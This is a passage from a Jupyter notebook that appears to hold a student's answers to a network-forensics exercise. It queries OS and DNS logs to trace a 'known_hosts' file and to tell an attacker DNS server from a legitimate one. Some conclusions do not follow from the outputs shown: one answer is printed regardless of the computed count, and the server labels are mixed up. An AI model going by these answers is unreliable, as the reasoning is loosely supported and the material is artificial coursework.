     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslogs_query[oslogs_query['columns.target_path'].str.contains('host')==True]['columns.target_path'].unique()\n",
    "####The file name is known_hosts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 162,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['/etc/dbus-1/system.d/org.freedesktop.hostname1.conf.dpkg-new',\n",
       "       '/root/.ssh/known_hosts', '/root/.ssh/.known_hosts.swp',\n",
       "       '/root/.ssh/.known_hosts.swpx', '/root/.ssh/known_hosts~'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 162,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslogs_query[oslogs_query['columns.target_path'].str.contains('host')==True]['columns.target_path'].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.3c"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>File name is known_hosts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "No the attacker didnt extract any hostnames\n"
     ]
    }
   ],
   "source": [
    "http_df['content_type'].str.contains('known_hosts').sum()\n",
    "print(\"No the attacker didnt extract any hostnames\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.4a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['22', '55595', '43204', '53', '47184', '45204', 'NA', '47111',\n",
       "       '51949', '60816', '36048', '58999', '53523', '57996', '43790',\n",
       "       '46118', '35552', '54157', '50018', '50020', '47298', '42076',\n",
       "       '40152', '46304', '443', '80', '54374', '46538', '33404', '43917'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns_df['Source_port'].unique() #We could see the port 53 in this dns server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['10.0.2.15'], dtype=object)"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns_df[dns_df['Source_port']=='53']['dest_ip'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['162.212.156.148', '75.75.75.75'], dtype=object)"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns_df[dns_df['Source_port']=='53']['src_host'].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Attacker DNS server is 162.212.156.148<br>\n",
    "Legitimate DNS server is 10.0.2.15"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.4b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.legend.Legend at 0x2a3fe797448>"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "sns.distplot( dns_df[dns_df['dest_ip']=='162.212.156.148']['length'] , color=\"black\", label=\"162.212.156.148\")\n",
    "sns.distplot( dns_df[dns_df['src_host']=='10.0.2.2']['length'] , color=\"red\", label=\"10.0.2.2\")\n",
    "plt.title(\"Distribution of DNS length Queries for Attacker and legitimate servers\")\n",
    "plt.ylabel(\"probability distribution\")\n",
    "plt.legend()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
